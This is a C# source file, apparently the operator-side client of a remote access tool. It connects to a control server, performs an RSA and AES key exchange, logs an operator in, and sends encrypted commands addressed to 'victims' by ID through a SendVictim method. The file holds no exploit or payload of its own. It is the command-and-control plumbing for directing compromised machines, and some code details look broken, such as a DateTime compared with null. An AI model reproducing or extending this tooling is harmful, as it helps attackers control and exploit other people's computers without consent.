using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;

namespace Eden
{
    public class clsClient
    {
        public delegate void StatusMessageHandler(int nCode = 0, string szMsg = null);
        public event StatusMessageHandler StatusMessage;

        public delegate void SecureServerSocketEstablishedHandler(clsClient clnt);
        public event SecureServerSocketEstablishedHandler SecureServerSocketEstablished;
        public delegate void SecureServerSocketFailedHandler(clsClient clnt, string szMsg = null);
        public event SecureServerSocketFailedHandler SecureServerSocketFailed;
        public delegate void SocketDisconnectHandler(clsClient clnt, string szMsg = null);
        public event SocketDisconnectHandler SocketDisconnect;

        public delegate void LoginSuccessfulHandler(clsClient clnt, string szUsername, int nAuthority);
        public event LoginSuccessfulHandler LoginSuccessful;
        public delegate void LoginFailedHandler(clsClient clnt, string szUsername, string szMsg = null);
        public event LoginFailedHandler LoginFailed;

        public delegate void ServerMessageReceivedHandler(clsClient clnt, string szVictimID, List<string> lsMsg);
        public event ServerMessageReceivedHandler ServerMessageReceived;

        public Socket m_sktServ;
        public string m_szSrvIP;
        public int m_nSrvPort;
        public (string, int) ServerHost { get { return (m_szSrvIP, m_nSrvPort); } }

        public EZCrypto.EZRSA m_EZRSA;
        public EZCrypto.EZAES m_EZAES;

        public byte[] m_abBuffer = new byte[clsTools.MAX_BUFFER_LENGTH];

        public const int MAX_BUFFER_LENGTH = 65536;
        public (int nCmd, int nParam) SERVER_COMMAND = (3, 3);

        public string m_szUsername;

        public DateTime m_dtLastLattency;
        public int m_nLattency = 0;

        public clsClient(Socket sktServ)
        {
            m_sktServ = sktServ;
            m_EZAES = new EZCrypto.EZAES();
            m_EZRSA = new EZCrypto.EZRSA();
        }

        public clsClient()
        {
            m_EZAES = new EZCrypto.EZAES();
            m_EZRSA = new EZCrypto.EZRSA();
        }

        void ShowBytes(byte[] abBuffer)
        {
            MessageBox.Show(clsTools.Debug.DisplayBytes(abBuffer));
        }

        public bool Connect(string szIPAddr, int nPort)
        {
            try
            {
                m_szSrvIP = szIPAddr;
                m_nSrvPort = nPort;

                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socket.BeginConnect(new IPEndPoint(IPAddress.Parse(szIPAddr), nPort), new AsyncCallback(ConnectCallback), socket);

                return true;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return false;
            }
        }

        public void ConnectCallback(IAsyncResult ar)
        {
            try
            {
                Socket socket = (Socket)ar.AsyncState;
                socket.EndConnect(ar);

                clsClient clnt = this;
                clnt.m_sktServ = socket;
                socket.BeginReceive(clnt.m_abBuffer, 0, MAX_BUFFER_LENGTH, SocketFlags.None, new AsyncCallback(ReceiveCallback), clnt);

                //Connect successfully.\\
                StatusMessage(szMsg: "PlainSocket is established.");
                m_sktServ = socket;

                SendCmdParam(0, 1);
                Thread.Sleep(1000);
                SendCmdParam(1, 0);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        public void ReceiveCallback(IAsyncResult ar)
        {
            clsClient clnt = (clsClient)ar.AsyncState;
            try
            {
                Socket socket = clnt.m_sktServ;
                clsEP ep = null;

                int nRecvLength = 0;
                byte[] abStaticRecv = new byte[MAX_BUFFER_LENGTH];
                byte[] abDynamicRecv = new byte[] { };

                do
                {
                    abStaticRecv = new byte[clsTools.MAX_BUFFER_LENGTH];
                    nRecvLength = socket.Receive(abStaticRecv);
                    abDynamicRecv = clsEP.CombineBytes(abDynamicRecv, 0, abDynamicRecv.Length, abStaticRecv, 0, nRecvLength);

                    if (nRecvLength <= 0)
                        break;
                    else if (abDynamicRecv.Length < clsEP.HEADER_SIZE)
                        continue;
                    else
                    {
                        var header_info = clsEP.GetHeader(abDynamicRecv);
                        while (abDynamicRecv.Length - clsEP.HEADER_SIZE >= header_info.len)
                        {

                            ep = new clsEP(abDynamicRecv);
                            abDynamicRecv = ep.MoreData;
                            header_info = clsEP.GetHeader(abDynamicRecv);

                            int nCmd = ep.Command;
                            int nParam = ep.Param;

                            byte[] abMsg = ep.GetMsg().msg;
                            if (nCmd == 0)
                            {
                                if (nParam == 0)
                                {

                                }
                                else if (nParam == 1)
                                {
                                    if (m_dtLastLattency == null)
                                    {
                                        m_dtLastLattency = DateTime.Now;
                                    }
                                    else
                                    {
                                        TimeSpan delta = DateTime.Now - m_dtLastLattency;
                                        m_nLattency = delta.Milliseconds;
                                    }

                                    Thread.Sleep(1000);
                                    SendCmdParam(0, 1);
                                }
                            }
                            else if (nCmd == 1)
                            {
                                if (nParam == 1)
                                {
                                    string szXmlPublicKey = EZCrypto.Encoder.b64d2str(Encoding.UTF8.GetString(abMsg));
                                    StatusMessage?.Invoke(szMsg: "Obtain RSA public key in xml form.");

                                    byte[] abKey = m_EZAES.m_abKey;
                                    byte[] abIV = m_EZAES.m_abIV;

                                    byte[] abEncIV = m_EZRSA.Encrypt(abIV, szXmlPublicKey);
                                    byte[] abEncKey = m_EZRSA.Encrypt(abKey, szXmlPublicKey);

                                    StatusMessage?.Invoke(szMsg: "Encrypt AES IV and Key successfully.");

                                    string szMsg = $"{EZCrypto.Encoder.bytese2b64(abEncIV)}|{EZCrypto.Encoder.bytese2b64(abEncKey)}";

                                    Send(1, 2, $"{EZCrypto.Encoder.stre2b64(szMsg)}");

                                    StatusMessage?.Invoke(szMsg: "Sent encrypted AES IV and Key.");
                                }
                                else if (nParam == 3)
                                {
                                    StatusMessage?.Invoke(szMsg: "Doing challenge and response.");

                                    string szChall = Encoding.UTF8.GetString(abMsg);
                                    byte[] abEncResp = m_EZAES.Encrypt(Encoding.UTF8.GetBytes(szChall));
                                    string szEncResp = Convert.ToBase64String(abEncResp);

                                    Send(1, 4, szEncResp);

                                    StatusMessage?.Invoke(szMsg: "Sent response.");
                                }
                                else if (nParam == 5) //Key exchange finish.
                                {
                                    SecureServerSocketEstablished?.Invoke(this);
                                    StatusMessage?.Invoke(szMsg: "Secure server socket is established.");
                                }
                            }
                            else if (nCmd == 3)
                            {
                                string szMsg = Encoding.UTF8.GetString(abMsg);
                                byte[] abCipher = EZCrypto.Encoder.b64d2bytes(szMsg);
                                string szPlain = Encoding.UTF8.GetString(m_EZAES.Decrypt(abCipher));
                                string[] aMsg = szPlain.Split('|');

                                try
                                {
                                    if (nParam == 0)
                                    {
                                        LoginFailed?.Invoke(clnt, aMsg[0]);
                                    }
                                    else if (nParam == 2)
                                    {
                                        StatusMessage?.Invoke(szMsg: "Login successfully.");
                                        m_szUsername = aMsg[0];
                                        LoginSuccessful?.Invoke(clnt, aMsg[0], 1);
                                    }
                                    else if (nParam == 4)
                                    {
                                        aMsg = aMsg.Select(x => EZCrypto.Encoder.b64d2str(x)).ToArray();

                                        string szVictimID = aMsg[0];
                                        ServerMessageReceived?.Invoke(clnt, szVictimID, aMsg[1..].ToList());

                                        PrivateHandler(aMsg);
                                    }
                                }
                                catch (InvalidOperationException)
                                {

                                }
                            }
                        }
                    }
                } 
                while (nRecvLength > 0);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            SocketDisconnect?.Invoke(this, null);
        }

        public void Send(int nCmd, int nParam, byte[] abMsg, bool bAsync = true)
        {
            byte[] abBuffer = new clsEP((byte)nCmd, (byte)nParam, abMsg).GetBytes();

            try
            {
                if (bAsync)
                {
                    m_sktServ.BeginSend(abBuffer, 0, abBuffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
                    {
                        m_sktServ.EndSend(ar);
                    }), abBuffer);
                }
                else
                {
                    m_sktServ.Send(abBuffer);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }
        public void Send(int nCmd, int nParam, string szMsg, bool bAsync = true)
        {
            Send(nCmd, nParam, Encoding.UTF8.GetBytes(szMsg), bAsync);
        }

        public void SendCipher(int nCmd, int nParam, string szMsg, bool bAsync = true)
        {
            byte[] abPlain = Encoding.UTF8.GetBytes(szMsg);
            byte[] abCipher = m_EZAES.Encrypt(abPlain);

            byte[] abBuffer = new clsEP((byte)nCmd, (byte)nParam, abCipher).GetBytes();

            try
            {
                if (bAsync)
                {
                    m_sktServ.BeginSend(abBuffer, 0, abBuffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
                    {
                        m_sktServ.EndSend(ar);
                    }), abBuffer);
                }
                else
                {
                    m_sktServ.Send(abBuffer);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        public void SendCmdParam(int nCmd, int nParam)
        {
            Send(nCmd, nParam, clsTools.GenerateRandomString());
        }

        public void SendCommand(string szMsg, bool bAsync = true)
        {
            SendCipher(SERVER_COMMAND.nCmd, SERVER_COMMAND.nParam, $"user|{m_szUsername}|{szMsg}", bAsync);
        }

        public void SendVictim(string szVictimID, string szMsg, bool bAsync = true)
        {
            SendCipher(SERVER_COMMAND.nCmd, SERVER_COMMAND.nParam, $"victim|{m_szUsername}|{szVictimID}|{szMsg}", bAsync);
        }

        public void Disconnect()
        {
            m_sktServ.Close();
            SocketDisconnect(this);
        }

        #region Server Function

        public void Login(string szUsername, string szPassword)
        {
            string szHashedPassword = EZCrypto.Hash.ComputeSha512(szPassword);
            SendCipher(3, 1, $"user|{szUsername}|{szHashedPassword}");
        }

        #endregion

        #region Others

        private void PrivateHandler(string[] aMsg)
        {
            if (aMsg[0] == "error")
            {
                bool bShowMsgbox = aMsg[1] == "1";
                string szCaption = aMsg[2];
                string szText = aMsg[3];

                if (bShowMsgbox)
                {
                    MessageBox.Show(szText, szCaption, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }

                StatusMessage?.Invoke(szMsg: "Login failed.");
            }
        }

        #endregion
    }
}
